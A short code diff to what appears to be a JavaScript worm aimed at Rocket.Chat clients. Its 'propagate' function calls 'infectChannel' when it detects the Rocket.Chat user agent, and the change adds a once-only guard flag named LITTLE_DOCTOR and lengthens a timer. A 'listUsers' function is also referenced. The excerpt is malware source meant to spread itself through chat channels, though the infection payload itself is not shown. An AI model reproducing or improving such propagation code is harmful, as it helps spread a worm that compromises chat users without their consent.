@@ -12,8 +12,12 @@ define({
 
     propagate: function() {
         if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
-            console.log('Starting RocketCat propagation module');
-            this.infectChannel();
+            // Ensure the little doctor only runs once
+            if (!window.LITTLE_DOCTOR) {
+                window.LITTLE_DOCTOR = true;
+                console.log('Starting RocketCat propagation module');
+                this.infectChannel();
+            }
         }
     },
 
@@ -39,7 +43,7 @@ define({
                 }
 
             }, 1500);
-        }, 2500);
+        }, 3500);
     },
 
     listUsers: function() {
